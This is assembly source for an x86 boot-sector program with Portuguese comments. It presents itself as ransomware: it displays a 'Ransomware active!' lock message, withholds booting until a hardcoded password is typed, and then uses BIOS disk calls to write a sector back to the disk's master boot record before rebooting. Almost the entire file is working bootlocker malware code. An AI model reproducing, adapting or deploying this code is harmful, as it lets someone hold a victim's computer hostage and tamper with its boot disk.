xor ax, ax
xor bx, bx
xor cx, cx
xor dx, dx

mov es, ax
mov ds, ax

;Escrever uma string

;mov ah, 0x13
;mov al, 0x01
mov ax, 0x1301
xor bx, bx
mov bl, 0x0f
mov cl, byte [tamanhoMensagem + 0x7c00]
xor dx, dx
mov bp, mensagem + 0x7c00
int 0x10


xor si, si

;Escrevemos

volta:

cmp si, [tamanhoSenha + 0x7c00]
je acertou

;verificamos o status do teclado

mov ah, 01
int 0x16

;se não tiver nada (ou seja, zf = 1), então fica nesse loop até ter algo

jz volta

;agora lemos o buffer do teclado

xor ax, ax
int 0x16

;lemos

;mostrar na tela o que o usuário pressionou no teclado

mov ah, 0x0e
xor bx, bx
int 0x10

cmp al, [senha + 0x7c00 + si]
jne errou

inc si

jmp volta


acertou:

;mov ah, 0x13
;mov al, 0x01
mov ax, 0x1301
xor bx, bx
mov bl, 0x0f
mov cl, byte [tamanhoMensagemParabens + 0x7c00]
xor dx, dx
mov dh, 0x04
mov bp, mensagemParabens + 0x7c00
int 0x10
jmp lerSetoresMemoria




errou:

;mov ah, 0x13
;mov al, 0x01
mov ax, 0x1301
xor bx, bx
mov bl, 0x0f
mov cl, byte [tamanhoMensagemErro + 0x7c00]
xor dx, dx
mov dh, 0x04
mov bp, mensagemErro + 0x7c00
int 0x10
jmp fim


fim:
jmp $


lerSetoresMemoria:
mov ah, 0x02
mov al, 0x02
mov ch, 0x00
mov cl, 0x02
mov dh, 0x00
mov dl, 0x80
mov bx, stage2 + 0x7c00
int 0x13

jmp stage2




mensagem: db 'Ransomware active! The machine will only start when the correct password is entered. ', 0x0a, 0x0d, 'key: ', 0x00
tamanhoMensagem: db ($ - mensagem)
mensagemErro: db 'Wrong password, access denied!', 0x00
tamanhoMensagemErro: db ($ - mensagemErro)
mensagemParabens: db 'Correct password!', 0x00
tamanhoMensagemParabens: db ($ - mensagemParabens)
senha: db 'Davi!'
tamanhoSenha: dw ($ - senha)

times 510 - ($ - $$) db 0x00
dw 0xAA55




stage2:
mov ah, 3
mov al, 1
mov ch, 0
mov cl, 1
mov dh, 0
mov dl, 0x80
mov bx, 0x8000
int 0x13

jmp 0xffff:0000

times 1024 - ($ - $$) db 0x00
